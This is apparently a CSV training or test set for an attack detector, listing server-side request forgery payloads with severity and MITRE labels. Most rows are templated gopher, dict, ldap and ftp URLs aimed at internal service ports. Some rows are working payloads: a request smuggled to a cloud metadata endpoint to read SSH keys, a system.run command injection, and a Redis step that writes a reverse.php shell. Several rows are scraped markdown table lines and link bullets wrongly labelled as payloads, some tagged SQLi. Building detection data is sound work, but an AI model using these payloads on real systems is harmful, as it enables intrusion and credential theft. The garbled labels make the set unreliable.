Payload,Signature,AttackType,Severity,MITRE,Label,Description
gopher://127.0.0.1:25:8080/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:3306/_,SSRF,Server Side Request Forgery,High,T1190,Malicious,Advanced Server Side Request Forgery variant
gopher://localhost,SSRF_4826,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery payload
ldap://internal.server.com,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| datasize  | (2 bytes) | 26 (%1A%00) |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| key length            | (2 bytes) | 10 | (%0A%00)       |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| modifier1 | (1 byte)  | 0 (%00)     |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| modifier2 | (1 byte)  | 0 (%00)     |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| value length          | (2 bytes) | 12 | (%0C%00)       |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:6379/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>,SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:6379/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/stats,SSRF,Server Side Request Forgery,High,T1190,Malicious,Advanced Server Side Request Forgery variant
dict://127.0.0.1:11211:6379/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
%0astats%0aquit,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| value length          | (2 bytes) | 12 | (%0C%00)       |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:8080/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
SET%20mykey%20,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:27017/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:5432/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:6379,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:22/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
/%61dmin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:5432/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:5432/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:6379/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:8080/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:3306/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:80/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:5432/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:8080/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:6379,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:6379/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:3306/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:8080/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:443/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:443/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:27017,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:5432/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:443/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
_system.run%5B%28id%29%3Bsleep%202s%5D,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
Parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`,SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:22/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:3306/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:8080/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:22/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:3306/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:3306,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:27017/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:5432/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:22/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| key length            | (2 bytes) | 10 | (%0A%00)       |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:5432/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:22,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:27017/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
/google.com:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:22,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| datasize  | (2 bytes) | 26 (%1A%00) |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:80/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:5432/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:27017/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:3306,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:6379/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:3306/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:3306/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:22/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:27017/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:443/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:5432/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:3306/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:6379/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:22/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
_config%20set%20dbfilename%20reverse.php,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:5432,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:443/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:27017/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:27017/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:27017/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:443/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:5432/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true),SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
